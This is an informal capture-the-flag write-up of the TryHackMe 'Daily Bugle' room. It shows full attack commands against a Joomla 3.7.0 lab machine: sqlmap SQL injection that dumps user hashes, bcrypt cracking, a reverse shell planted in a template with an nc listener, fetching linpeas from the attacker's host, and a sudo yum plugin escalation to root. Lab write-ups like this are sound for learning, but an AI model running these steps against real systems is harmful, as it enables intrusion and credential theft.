# Daily Bugle [TryHackMe]

<sub>_This is a raw write-up. I write these to document important things for myself to use later if I need it. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.127.134
```

Let's browse it:

```
firefox $targ3t
```
- Who robbed the bank?
__spiderman__

Let's perform an `nmap` scan and check for open ports:

```
nmap -A -Pn $targ3t -oN nmap.scan
```

We observe three open ports: `22`, `3306`, `80`, which makes it `ssh`, `mysql` and `http` respectively. Let's start with `http`. We can see it runs on `Apache/2.4.6 (CentOS) PHP/5.6.40` and the CMS seems to be `Joomla`. `nmap` found a number of paths on this website, one of which works/has content (`/administrator`). Let's put it through `gobuster` and see what it finds:

```
gobuster dir -u http://$targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.scan
```

It found a number of paths. Most of these `nmap` has already supplied, others are useless. Let's see if we can find a version of `Joomla` running on this server. Scans didn't reveal much unfortunately. I did some research online and apparently you can open `/language/en-GB/` path and check the `xml` file for version.

- What is the Joomla version?
__3.7.0__

Let's see what exploits are available for this one:

```
searchsploit Joomla 3.7.0
```

There's a text file:

```
searchsploit -m php/webapps/42033.txt
```

It details exploitation of password reset field through `sqlmap`:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

A number of databases have been revealed, one of which was `mysql`. Let's find out what tables it has:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D mysql --tables
```

A lot of tables, let's see if `users` has anything in it:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D mysql -T tables --dump
```

The process is slow, but 10% in, it seems like this is the wrong database. I ran parallel scan to try `joomla` database:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla --tables
```

This retrieved `#__users` table:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' --dump
```

4% in -- we already have four columns: `id`, `name`, `username`, `email`. I'll let both scans finish. 

7% in, another column named `password` in the `joomla` database. Looks like this is the one. 

<sub>I took a shortcut over here and enumerated the password column directly after interrupting this scan</sub>

Enumarate password column:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' -C password --dump
```

We got one password hash, so there has to be one username.

```
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Enumerate username column:

```
sqlmap -u "http://10.10.127.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomla -T '#__users' -C username --dump
```

The resulting username is `jonah`.

Let's try to crack this hash:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

The resulting password appears to be `spiderman123`. Let's try it in `ssh`:

```
ssh jonah@targ3t
```

Didn't work. Let's try it on `/administrator`. 

And we're inside `Joomla` CMS interface. I wonder if we can sneak a PHP reverse shell somewhere in here. Maybe templates.

It appears we can modify `index.php` file and save it and then just request site's homepage. I'll just paste a pentest monkey reverse shell into it.

Start netcat listener:

```
nc -lvnp 9876
```

We got the shell, and we are user `apache`. 

```
find / -perm /4000 2>/dev/null
```

The list doesn't give away anything useful in terms of `gtfobins`.

```
cat /etc/crontab
```

Nothing here.

```
sudo -l
```

We can't use sudo. Let's try `linpeas`:

```
python -m http.server 8080
```

On the victim:

```
wget http://<My IP>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

CVEs didn't work, I didn't check everything. I realized as `apache` user I have access to `/var/www/html` and there I found I curious file `configuration.php`, which has a variable `$password` defined for user `root`:

```
nv5uz9r3ZEDzVjNu
```

Let's try to log in as root then:

```
su -
```

Looks like it's a `mysql` password:

```
mysql -u root -p mysql
show databases;
use mysql;
show tables;
select * from user;
select User, Password from user;
```

This is a password hash for user root, but I can't crack it for the life of me having tried many things. Instead I'll go back to the `configuration.php` password and try to use it for `jjameson` user.

Which... worked. For some reason.

```
cat /home/jjameson/user.txt
```

This user can run `yum` with sudo. There's a command sequence on `gtfobins`, that servers this purpose

So on a host machine:

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Hit enter. This did the trick:

```
cat /root/root.txt
```
